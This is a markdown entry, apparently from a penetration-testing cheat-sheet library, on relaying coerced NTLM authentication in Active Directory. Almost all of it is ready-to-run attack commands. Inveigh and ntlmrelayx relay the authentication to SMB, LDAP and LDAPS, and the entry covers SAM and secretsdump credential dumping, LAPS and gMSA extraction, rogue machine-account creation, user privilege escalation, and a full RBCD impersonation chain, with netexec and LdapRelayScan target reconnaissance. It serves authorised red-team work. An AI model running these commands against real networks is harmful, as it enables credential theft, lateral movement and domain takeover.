---
technique: NTLMRelay
category: ntlm
protocols: SMB, LDAP, LDAPS, HTTP, MSSQL
remote_capable: true
tags: ntlm relay mitm lateral-movement privilege-escalation ad
---

# NTLMRelay

After coercing a victim into authenticating to an attacker server, the NTLM authentication can be relayed to a third target rather than just captured. The attacker authenticates to the target as the victim, enabling credential dumps, command execution, LDAP writes, or RBCD abuse, depending on the victim's privileges and the mitigations in place.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| SMB signing | Must be disabled on SMB targets; check with netexec before relaying |
| LDAP signing / channel binding | Check with LdapRelayScan before relaying to LDAP/LDAPS |
| MIC bypass | Use `--remove-mic` when relaying across protocols or to LDAP/S |
| Responder servers | Disable SMB and HTTP in Responder.conf when combining with ntlmrelayx |

## Windows

### Inveigh-Relay

#powershell #relay #smb

Relay NTLM authentications from within a Windows host using Inveigh's built-in relay engine.

```powershell title:"Relay NTLM authentications with Inveigh-Relay"
.\Inveigh.exe -Challenge 1122334455667788 -ConsoleOutput Y -LLMNR Y -NBNS Y -relay Y -relayTarget "$relay_target"
```
<!-- cheat
var relay_target
-->

## Linux

### ntlmrelayx (credential dump)

#impacket #smb #relay #dump

Relay inbound NTLM over SMB and dump SAM secrets from the target if the relayed account has local admin rights.

```sh title:"Relay NTLM to SMB and dump credentials"
ntlmrelayx.py -t "smb://$relay_target"
```
<!-- cheat
var relay_target
-->

### Step 1: Relay NTLM to SOCKS proxies (ntlmrelayx)

#impacket #socks #relay #multi-target

Relay NTLM from a target list and open persistent SOCKS proxies for each successful relay session.

```sh title:"Relay NTLM and open SOCKS proxies for multiple targets"
ntlmrelayx.py -tf targets.txt -socks
```
<!-- cheat -->

### Step 2: Dump credentials through SOCKS proxy (proxychains + secretsdump)

#impacket #socks #relay #dump

Dump credentials through an established ntlmrelayx SOCKS proxy using proxychains and secretsdump.

```sh title:"Dump credentials through ntlmrelayx SOCKS proxy via proxychains"
proxychains secretsdump.py -no-pass "$domain/$user@$relay_target"
```
<!-- cheat
import domain_ip
import users
var relay_target
-->

### ntlmrelayx (LDAP enum)

#impacket #ldap #relay #enum

Relay NTLM to a domain controller over LDAP and dump AD objects including ADCS, LAPS, and gMSA data.

```sh title:"Relay NTLM to LDAP and enumerate domain"
ntlmrelayx.py -t "ldap://$rhost_ip" --dump-adcs --dump-laps --dump-gmsa
```
<!-- cheat
import domain_ip
-->

### ntlmrelayx (machine account creation)

#impacket #ldaps #relay #machineaccount

Relay NTLM to LDAPS and create a new machine account using the default ms-DS-MachineAccountQuota allowance.

```sh title:"Relay NTLM to LDAPS and create machine account"
ntlmrelayx.py -t "ldaps://$rhost_ip" --add-computer SHUTDOWN --remove-mic
```
<!-- cheat
import domain_ip
-->

### ntlmrelayx (privilege escalation)

#impacket #ldaps #relay #privesc

Relay NTLM to LDAPS and escalate a controlled user's privileges by adding it to a privileged group or abusing ACEs.

```sh title:"Relay NTLM to LDAPS and escalate user privileges"
ntlmrelayx.py -t "ldaps://$rhost_ip" --escalate-user "$target_user" --remove-mic
```
<!-- cheat
import domain_ip
var target_user
-->

### Step 1: Relay NTLM to LDAPS for RBCD (ntlmrelayx)

#impacket #ldaps #relay #rbcd #delegation

Relay NTLM to LDAPS and configure Resource-Based Constrained Delegation on the victim machine to gain admin access to it.

```sh title:"Relay NTLM to LDAPS and configure RBCD"
ntlmrelayx.py -t "ldaps://$rhost_ip" --escalate-user "$controlled_machine_account" --delegate-access --remove-mic
```
<!-- cheat
import domain_ip
var controlled_machine_account
-->

### Step 2: Request impersonation ticket for RBCD (getST)

#impacket #kerberos #rbcd #delegation

Request a service ticket impersonating the target user using the RBCD delegation set up in the previous step.

```sh title:"Request impersonation service ticket via getST for RBCD"
getST.py -spn "host/$relay_target" "$domain/$controlled_machine_account:$pass" -dc-ip "$rhost_ip" -impersonate "$impersonate_user"
```
<!-- cheat
import domain_ip
import passwords
var relay_target
var controlled_machine_account
var impersonate_user
-->

### Step 3: Set KRB5CCNAME to impersonation ticket (RBCD)

#shell #env

Set KRB5CCNAME to the ccache written by getST.py before dumping credentials from the relay target.

```sh title:"Load RBCD impersonation ccache into KRB5CCNAME"
export KRB5CCNAME="$impersonate_user.ccache"
```
<!-- cheat
var impersonate_user
-->

### Step 4: Dump credentials with impersonation ticket (secretsdump)

#impacket #kerberos #rbcd #dump

Use the impersonation ccache ticket to dump credentials from the relay target via secretsdump.

```sh title:"Dump credentials from RBCD target using impersonation ticket"
secretsdump.py -k "$relay_target"
```
<!-- cheat
var relay_target
-->

### netexec (relay target discovery)

#smb #recon #signing

Generate a relay target list of SMB hosts without signing required.

```sh title:"Generate SMB relay target list with netexec"
nxc smb --gen-relay-list targets.txt "$subnet"
```
<!-- cheat
var subnet
-->

### netexec (relay target validation)

#smb #recon #signing

Validate a selected SMB relay target before using it.

```sh title:"Validate selected SMB relay target with netexec"
nxc smb "$relay_target"
```
<!-- cheat
var relay_target
-->

### LdapRelayScan

#ldap #recon #signing

Check LDAP and LDAPS signing and channel binding requirements on a domain controller before relaying.

```sh title:"Check LDAP relay requirements with LdapRelayScan"
LdapRelayScan.py -u "$user" -p "$pass" -dc-ip "$rhost_ip" -method BOTH
```
<!-- cheat
import domain_ip
import users
import passwords
-->
